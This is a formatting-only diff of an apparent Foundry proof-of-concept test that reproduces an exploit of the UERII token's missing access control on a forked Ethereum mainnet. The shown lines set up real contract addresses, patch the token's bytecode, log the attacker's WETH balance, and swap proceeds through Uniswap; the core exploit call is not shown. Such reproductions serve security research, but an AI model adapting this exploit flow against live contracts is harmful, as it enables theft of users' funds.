@@ -23,10 +23,14 @@ interface IUERII is IERC20 {
 }
 
 contract ContractTest is BaseTestWithBalanceLog {
-    IUERII constant UERII_TOKEN = IUERII(0x418C24191aE947A78C99fDc0e45a1f96Afb254BE);
-    IUSDC constant USDC_TOKEN = IUSDC(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
-    IWETH constant WETH_TOKEN = IWETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));
-    Uni_Router_V3 constant UNI_ROUTER = Uni_Router_V3(0xE592427A0AEce92De3Edee1F18E0157C05861564);
+    IUERII constant UERII_TOKEN =
+        IUERII(0x418C24191aE947A78C99fDc0e45a1f96Afb254BE);
+    IUSDC constant USDC_TOKEN =
+        IUSDC(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
+    IWETH constant WETH_TOKEN =
+        IWETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));
+    Uni_Router_V3 constant UNI_ROUTER =
+        Uni_Router_V3(0xE592427A0AEce92De3Edee1F18E0157C05861564);
 
     function setUp() public {
         vm.createSelectFork("mainnet", 15_767_837);
@@ -39,13 +43,17 @@ contract ContractTest is BaseTestWithBalanceLog {
         vm.label(0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640, "USDC_WETH_PAIR");
 
         // replace bytecode of vulenrable contract
-        bytes memory newRuntimeBytecode = vm.readFileBinary("src/Uerii_exp/patch.bin");
+        bytes memory newRuntimeBytecode = vm.readFileBinary(
+            "src/Uerii_exp/patch.bin"
+        );
         vm.etch(address(UERII_TOKEN), newRuntimeBytecode);
     }
 
     function testExploit() public {
         emit log_named_decimal_uint(
-            "[Start] Attacker WETH balance before exploit", WETH_TOKEN.balanceOf(address(this)), 18
+            "[Start] Attacker WETH balance before exploit",
+            WETH_TOKEN.balanceOf(address(this)),
+            18
         );
 
         // Actual payload exploiting the missing access control
@@ -60,7 +68,9 @@ contract ContractTest is BaseTestWithBalanceLog {
         _USDCToWETH();
 
         emit log_named_decimal_uint(
-            "[End] Attacker WETH balance after exploit", WETH_TOKEN.balanceOf(address(this)), 18
+            "[End] Attacker WETH balance after exploit",
+            WETH_TOKEN.balanceOf(address(this)),
+            18
         );
     }
 
@@ -68,16 +78,17 @@ contract ContractTest is BaseTestWithBalanceLog {
      * Auxiliary function to swap all UERII to USDC
      */
     function _UERIIToUSDC() internal {
-        Uni_Router_V3.ExactInputSingleParams memory _Params = Uni_Router_V3.ExactInputSingleParams({
-            tokenIn: address(UERII_TOKEN),
-            tokenOut: address(USDC_TOKEN),
-            fee: 500,
-            recipient: address(this),
-            deadline: block.timestamp,
-            amountIn: UERII_TOKEN.balanceOf(address(this)),
-            amountOutMinimum: 0,
-            sqrtPriceLimitX96: 0
-        });
+        Uni_Router_V3.ExactInputSingleParams memory _Params = Uni_Router_V3
+            .ExactInputSingleParams({
+                tokenIn: address(UERII_TOKEN),
+                tokenOut: address(USDC_TOKEN),
+                fee: 500,
+                recipient: address(this),
+                deadline: block.timestamp,
+                amountIn: UERII_TOKEN.balanceOf(address(this)),
+                amountOutMinimum: 0,
+                sqrtPriceLimitX96: 0
+            });
         UNI_ROUTER.exactInputSingle(_Params);
     }
 
@@ -85,16 +96,17 @@ contract ContractTest is BaseTestWithBalanceLog {
      * Auxiliary function to swap all USDC to WETH
      */
     function _USDCToWETH() internal {
-        Uni_Router_V3.ExactInputSingleParams memory _Params = Uni_Router_V3.ExactInputSingleParams({
-            tokenIn: address(USDC_TOKEN),
-            tokenOut: address(WETH_TOKEN),
-            fee: 500,
-            recipient: address(this),
-            deadline: block.timestamp,
-            amountIn: USDC_TOKEN.balanceOf(address(this)),
-            amountOutMinimum: 0,
-            sqrtPriceLimitX96: 0
-        });
+        Uni_Router_V3.ExactInputSingleParams memory _Params = Uni_Router_V3
+            .ExactInputSingleParams({
+                tokenIn: address(USDC_TOKEN),
+                tokenOut: address(WETH_TOKEN),
+                fee: 500,
+                recipient: address(this),
+                deadline: block.timestamp,
+                amountIn: USDC_TOKEN.balanceOf(address(this)),
+                amountOutMinimum: 0,
+                sqrtPriceLimitX96: 0
+            });
         UNI_ROUTER.exactInputSingle(_Params);
     }
 }
